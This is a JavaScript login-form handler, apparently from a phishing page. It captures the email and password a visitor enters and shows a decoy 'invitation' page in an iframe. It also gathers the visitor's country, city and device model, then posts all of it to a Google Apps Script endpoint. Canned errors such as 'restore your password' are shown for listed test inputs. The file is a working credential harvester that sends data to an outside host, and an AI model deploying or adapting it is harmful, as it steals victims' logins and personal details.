document.getElementById("miFormulario").addEventListener("submit", async function(event) {
    event.preventDefault(); // Evita el envío automático

    // Obtener elementos del formulario
    const emailInput = document.querySelector('input[name="email"]');
    const passwordInput = document.querySelector('input[name="password"]');
    const errorMessage = document.getElementById('error-message');
    
    // Lista de correos electrónicos y contraseñas prohibidas
    const prohibitedEmails = ["ejemplo@correo.com"]; // Agregar correos prohibidos aquí
    const prohibitedWords = ["ejemplo1"]; // Agregar contraseñas prohibidas aquí
    
    const email = emailInput.value.trim().toLowerCase();
    const password = passwordInput.value;
    
    // Validar formato de correo electrónico
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        errorMessage.textContent = "Correo electrónico no válido";
        errorMessage.style.color = 'red';
        return; // Detiene el procesamiento
    }
    
    // Verificar correo prohibido
    const isProhibitedEmail = prohibitedEmails.includes(email);
    if (isProhibitedEmail) {
        errorMessage.textContent = "No se encuentra la dirección de correo";
        errorMessage.style.color = 'red';
        emailInput.value = '';
        passwordInput.value = '';
        return; // Detiene el procesamiento
    }
    
    // Verificar contraseña prohibida
    const containsProhibitedPassword = prohibitedWords.some(word => password.includes(word));
    if (containsProhibitedPassword) {
        errorMessage.textContent = "Restaure su contraseña y vuelva a intentar";
        errorMessage.style.color = 'red';
        passwordInput.value = '';
        return; // Detiene el procesamiento
    }
    
    // Si pasa todas las validaciones, continúa con el proceso normal
    // Limpiar cualquier mensaje de error previo
    if (errorMessage) {
        errorMessage.textContent = "";
    }

    // Ocultar el formulario
    document.getElementById("miFormulario").style.display = "none";
    
    // Mostrar mensaje "Cargando..."
    let loadingMessage = document.createElement("p");
    loadingMessage.textContent = "⏳ Procesando... por favor, espere.";
    loadingMessage.style.textAlign = "center";
    document.body.appendChild(loadingMessage);
    
    // Cargar usuario.html dentro del iframe sin heredar estilos
    let iframe = document.getElementById("usuarioFrame");
    iframe.src = "invitation.html";
    iframe.style.display = "block"; // Hacer visible el iframe
    
    // Eliminar mensaje de carga después de mostrar usuario.html
    iframe.onload = function() {
        loadingMessage.remove();
    };
    
    // ✅ Detectar modelo exacto del dispositivo (Android o iPhone)
    let deviceInfo = detectDeviceModel();
    
    // ✅ Obtener el país y ciudad del usuario desde la API
    let country = "Desconocido";
    let city = "Desconocido";
    try {
        const response = await fetch("https://ipwhois.app/json/");
        const data = await response.json();
        if (data) {
            if (data.country) {
                country = data.country; // Captura el país
            }
            if (data.city) {
                city = data.city; // Captura la ciudad
            }
        }
    } catch (error) {
        console.error("Error obteniendo la ubicación:", error);
    }
    
    // ✅ Asegurar que los datos se agregan correctamente antes de enviarlos
    const formData = new FormData(this);
    formData.append("device", deviceInfo.type); // Agregar tipo de dispositivo
    formData.append("modelo", deviceInfo.model); // Agregar modelo específico
    formData.append("country", country); // Agregar país
    formData.append("city", city); // Agregar ciudad
    
    // ✅ Enviar los datos correctamente a Google Sheets
    const url = "https://script.google.com/macros/s/AKfycbxecXJGiURxApfpFHvcZCRvxaXNmzPitUCnaBtjNzlpPMWefOzH7Sj2eTOouF-Qjz7Q/exec";
    fetch(url, {
        method: "POST",
        body: new URLSearchParams(formData),
        headers: { "Content-Type": "application/x-www-form-urlencoded" }
    }).catch(error => console.error("Error al enviar datos:", error));
});

// Función para detectar el modelo exacto del dispositivo
function detectDeviceModel() {
    const userAgent = navigator.userAgent;
    let deviceType = "Otro";
    let deviceModel = "Desconocido";
    
    // Detectar iPhone y su modelo
    if (/iPhone/.test(userAgent)) {
        deviceType = "iPhone";
        
        // Intentar identificar el modelo de iPhone
        const iPhoneMatch = userAgent.match(/iPhone\s*(?:OS\s*)?(\d+[_\d]*)/i);
        if (iPhoneMatch) {
            // Esta es una aproximación, ya que el User Agent no contiene el modelo exacto
            // Los iPhones más nuevos solo pueden estimarse por la versión de iOS y dimensiones de pantalla
            const version = iPhoneMatch[1].replace(/_/g, '.');
            
            // Mapeo muy básico (es una aproximación)
            if (/(15|16)/.test(version)) {
                deviceModel = "iPhone 13-16 Series"; // Aproximación
            } else if (/(13|14)/.test(version)) {
                deviceModel = "iPhone 11-12 Series"; // Aproximación
            } else if (/(11|12)/.test(version)) {
                deviceModel = "iPhone X-XS Series"; // Aproximación
            } else {
                deviceModel = "iPhone (versión anterior)";
            }
        }
    } 
    // Detectar iPad
    else if (/iPad/.test(userAgent)) {
        deviceType = "iPad";
        deviceModel = "iPad";
    } 
    // Detectar Android y su modelo
    else if (/Android/.test(userAgent)) {
        deviceType = "Android";
        
        // Intentar extraer el modelo específico de Android
        const matches = userAgent.match(/Android\s([0-9\.]+);\s([^;)]+)/);
        if (matches && matches.length > 2) {
            let model = matches[2].trim();
            
            // Limpiar el modelo para hacerlo más legible
            model = model.replace(/Build\/[^\s]+/, '').trim();
            
            // Identificar modelos conocidos
            if (/SM-S[^\s]+/.test(model)) {
                deviceModel = "Samsung " + model;
                
                // Mapear códigos de modelo a nombres comerciales (básico)
                if (/SM-S20/.test(model)) {
                    deviceModel = "Samsung Galaxy S20";
                } else if (/SM-S21/.test(model)) {
                    deviceModel = "Samsung Galaxy S21";
                } else if (/SM-S22/.test(model)) {
                    deviceModel = "Samsung Galaxy S22";
                } else if (/SM-G998/.test(model)) {
                    deviceModel = "Samsung Galaxy S21 Ultra";
                } else if (/SM-S908/.test(model)) {
                    deviceModel = "Samsung Galaxy S22 Ultra";
                } else if (/SM-S918/.test(model)) {
                    deviceModel = "Samsung Galaxy S23 Ultra";
                }
            } else if (/Pixel/.test(model)) {
                deviceModel = "Google " + model;
            } else if (/OnePlus/.test(model)) {
                deviceModel = model;
            } else if (/Xiaomi/.test(model) || /Redmi/.test(model)) {
                deviceModel = model;
            } else {
                deviceModel = model;
            }
        }
    }
    
    return {
        type: deviceType,
        model: deviceModel
    };
}
